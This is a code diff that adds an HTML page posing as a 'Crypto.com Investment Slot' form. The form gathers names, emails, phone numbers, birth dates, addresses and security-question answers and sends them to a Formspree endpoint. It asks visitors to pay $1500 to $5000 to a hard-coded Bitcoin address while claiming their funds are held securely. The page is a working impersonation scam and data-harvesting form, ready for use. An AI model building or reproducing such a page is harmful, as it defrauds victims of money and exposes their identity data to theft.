@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Crypto Investment Slot</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="ad.css" />
+  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+</head>
+<body>
+    <form id="myForm">
+    <img src="https://res.cloudinary.com/dimmzhivr/image/upload/e_background_removal/f_png/v1751229926/crpto_logo_c7rvk2.jpg" alt="Company Logo" class="form-logo" />
+    <h2>Crypto.com Investment Slot</h2>
+
+    <label for="fullname">Full Name:</label>
+    <input type="text" id="fullname" name="fullname" required />
+
+    <label for="email">Email Address:</label>
+    <input type="email" id="email" name="email" required />
+
+    <label for="phone">Phone Number:</label>
+    <input type="tel" id="phone" name="phone" />
+
+    <label for="dob">Date of Birth:</label>
+    <input type="date" id="dob" name="dob" />
+
+    <label for="country">Country:</label>
+    <select id="country" name="country" required>
+      <option value="">Select your country</option>
+      <option value="Nigeria">United States</option>
+      <option value="United Kingdom">United Kingdom</option>
+      <option value="United States">Australia</option>
+      <option value="Canada">Canada</option>
+      <option value="Germany">Germany</option>
+      <option value="Netherlands">Netherlands</option>
+      <option value="France">France</option>
+      <option value="South Africa">South Africa</option>
+      <option value=""></option>
+
+    </select>
+
+    <style>
+      .wallet-input-wrapper {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        max-width: 500px;
+        margin-top: 20px;
+      }
+    
+      .wallet-input-wrapper input {
+        flex: 1;
+        padding: 10px;
+        font-size: 1rem;
+        border: 1px solid #ccc;
+        border-radius: 6px;
+      }
+    
+      .copy-btn {
+        padding: 10px 16px;
+        font-size: 0.9rem;
+        background-color: #f3961c;
+        color: white;
+        border: none;
+        border-radius: 6px;
+        cursor: pointer;
+        transition: background 0.3s ease;
+      }
+    
+      .copy-btn:hover {
+        background-color: #d37f0b;
+      }
+    </style>
+    
+    <label for="btc">Official Company BTC Address (Remittance):</label>
+<div class="wallet-input-wrapper">
+  <input 
+    type="text" 
+    id="btc" 
+    name="btc" 
+    value="1CxzwQAFPA4iuNfvfgKUfn8PDQn2dTH19Z" 
+    readonly 
+    required 
+  />
+  <button type="button" class="copy-btn" onclick="copyBTC()">Copy</button>
+</div>
+    
+    <script>
+      function copyBTC() {
+        const btcInput = document.getElementById("btc");
+        btcInput.select();
+        btcInput.setSelectionRange(0, 99999); // For mobile compatibility
+    
+        navigator.clipboard.writeText(btcInput.value).then(() => {
+          alert("✅ Bitcoin address copied to clipboard!");
+        }).catch(err => {
+          alert("❌ Failed to copy. Please try manually.");
+        });
+      }
+    </script>
+
+<label for="investment">Select Investment Slot :</label>
+<select id="investment" name="investment" required>
+  <option value="#">starter slot ('$1500')</option>
+  <option value="#">standard slot ('$2500')</option>
+  <option value="#">premium slot ('$3700')</option>
+  <option value="#">vip slot ('$5000')</option>
+    </select>
+
+    <label for="address">Residential Address:</label>
+    <textarea id="address" name="address"></textarea>
+
+    
+    <label for="security_question">Security Question (optional):</label>
+    <select id="security_question" name="security_question">
+      <option value="">Choose a question</option>
+      <option value="pet">What was the name of your first pet?</option>
+      <option value="school">What is the name of your first school?</option>
+      <option value="city">In what city were you born?</option>
+    </select>
+
+    <label for="security_answer">Your Answer:</label>
+    <input type="text" id="security_answer" name="security_answer" />
+
+    <label for="captcha">What is 4 + 3? (CAPTCHA)</label>
+    <input type="text" id="captcha" name="captcha" required />
+
+    <p style="margin-top: 15px; font-weight: bold; color: red;">
+      ⚠️ Note: Your funds will be held securely throughout the agreed investment period. By proceeding, you acknowledge that you are making an investment in Bitcoin and stock market, and you confirm that your participation complies with all applicable legal, financial, and regulatory requirements in your country of residence.
+    </p>
+
+    <label>
+      <input type="checkbox" required />
+      I agree to the <a href="#">terms and conditions</a> and acknowledge the investment risk.
+    </label>
+     <button type="submit">Submit</button>
+   
+  </form>
+  <script>
+    document.getElementById("myForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+  
+      // ✅ CAPTCHA validation
+      const captchaInput = document.getElementById("captcha").value.trim();
+      if (captchaInput !== "7") {
+        alert("❌ Incorrect CAPTCHA. Please answer '4 + 3' correctly.");
+        return;
+      }
+  
+      const form = e.target;
+      const data = new FormData(form);
+  
+      fetch("https://formspree.io/f/mvgrlgaw", {
+        method: "POST",
+        body: data,
+        headers: {
+          Accept: "application/json"
+        }
+      }).then(response => {
+        if (response.ok) {
+          window.location.href = "second.html";
+        } else {
+          alert("Something went wrong. Please try again.");
+        }
+      }).catch(error => {
+        console.error(error);
+        alert("Network error. Try again.");
+      });
+    });
+  
+    // ✅ Optional: Style inputs on typing
+    $('input').on('input', function () {
+      $(this).css({
+        'background-color': '#e0f0ff',
+        'color': '#003366',
+        'border-color': '#0077ff'
+      });
+    });
+  </script>
+</body>
+</html>
